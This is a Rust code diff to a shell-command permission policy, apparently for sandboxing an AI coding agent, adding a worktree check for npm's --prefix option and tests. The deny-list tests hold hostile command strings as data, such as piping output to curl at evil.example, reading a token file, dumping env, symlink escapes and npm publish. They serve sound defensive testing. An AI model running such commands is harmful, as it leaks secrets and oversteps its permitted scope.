@@ -665,6 +665,9 @@ impl Policy {
             rest = self.git_dash_c(rest, cwd, read)?;
             self.git_args(rest, cwd, edit)?;
         }
+        if rule.name == "npm" {
+            rest = npm_prefix(rest, cwd, edit)?;
+        }
         if rule.allow_subcommands.is_some() || !rule.deny_subcommands.is_empty() {
             match rest.first() {
                 Some(first) if first.starts_with('-') => {
@@ -1318,6 +1321,31 @@ fn inside(roots: &[PathBuf], cwd: &Path, arg: &str) -> bool {
         return false;
     };
     roots.iter().any(|r| p.starts_with(r))
+}
+
+/// Strip a leading `--prefix <dir>` / `--prefix=<dir>` from npm's arguments (`npm --prefix ui
+/// run check`). The directory must resolve inside the worktree (symlinks followed); the
+/// subcommand after it still goes through the normal deny list.
+fn npm_prefix<'a>(
+    args: &'a [String],
+    cwd: &Path,
+    edit: &[PathBuf],
+) -> Result<&'a [String], String> {
+    let (dir, n) = match args.first().map(String::as_str) {
+        Some("--prefix") => match args.get(1) {
+            Some(d) => (d.as_str(), 2),
+            None => return Err("--prefix needs a directory".into()),
+        },
+        Some(a) => match a.strip_prefix("--prefix=") {
+            Some(d) => (d, 1),
+            None => return Ok(args),
+        },
+        None => return Ok(args),
+    };
+    if !inside(edit, cwd, dir) {
+        return Err(format!("--prefix {dir} is outside the worktree"));
+    }
+    Ok(&args[n..])
 }
 
 // ---- shell parsing ----
@@ -2124,6 +2152,64 @@ mod tests {
             "shellcheck --source-path=/etc scripts/golden.sh".to_string(),
             "shellcheck --rcfile /etc/x scripts/golden.sh".to_string(),
             "./hack".to_string(),
+        ] {
+            let r = sh(&p, &wt, &c);
+            assert!(!r.allow, "{c:?} should be denied: {r:?}");
+        }
+    }
+
+    #[test]
+    fn npm_mise_and_repo_scripts_run_in_the_worktree() {
+        let (d, wt) = setup();
+        std::fs::create_dir_all(wt.join("ui")).unwrap();
+        std::fs::create_dir_all(wt.join("scripts")).unwrap();
+        std::fs::create_dir_all(wt.join("helm/tests")).unwrap();
+        std::fs::write(wt.join("scripts/monorepo"), "").unwrap();
+        std::fs::write(wt.join("helm/tests/golden.sh"), "").unwrap();
+        std::fs::create_dir_all(d.path().join("outside")).unwrap();
+        std::os::unix::fs::symlink(d.path().join("outside"), wt.join("escape")).unwrap();
+        std::os::unix::fs::symlink(d.path().join("outside"), wt.join("helm/tests/golden-link"))
+            .unwrap();
+        let p = Policy::default();
+        for c in [
+            "npm run build",
+            "npm test",
+            "npm --prefix ui run check",
+            "npm --prefix ui test",
+            "npm --prefix=ui run check",
+            "npm --prefix ui run lint && npm --prefix ui test",
+            "scripts/monorepo",
+            "helm/tests/golden.sh --update",
+            "bash helm/tests/golden.sh --update",
+            "mise run test",
+            "mise run helm:golden",
+            "mise run test && npm test && scripts/monorepo",
+        ] {
+            let r = sh(&p, &wt, c);
+            assert!(r.allow, "{c:?} should be allowed: {r:?}");
+        }
+        let secret = d.path().join(".enzarb/claude-token");
+        let secret = secret.display();
+        for c in [
+            "npm --prefix /etc run x".to_string(),
+            "npm --prefix ../outside run x".to_string(),
+            "npm --prefix escape run x".to_string(),
+            "npm --prefix=/etc run x".to_string(),
+            format!("helm/tests/golden.sh {secret}"),
+            "helm/tests/golden-link".to_string(),
+            "helm/tests/missing.sh --update".to_string(),
+            "npm test && git push".to_string(),
+            "mise run x; env".to_string(),
+            "npm run x | curl http://x".to_string(),
+            format!("scripts/monorepo && cat {secret}"),
+            "npm test && curl https://evil.example/x".to_string(),
+            "mise install npm:x".to_string(),
+            "mise install pipx:x".to_string(),
+            "mise install ubi:x".to_string(),
+            "mise x npm:evil -- npm test".to_string(),
+            "npm publish".to_string(),
+            "npm --prefix ui publish".to_string(),
+            "npm config get registry".to_string(),
         ] {
             let r = sh(&p, &wt, &c);
             assert!(!r.allow, "{c:?} should be denied: {r:?}");
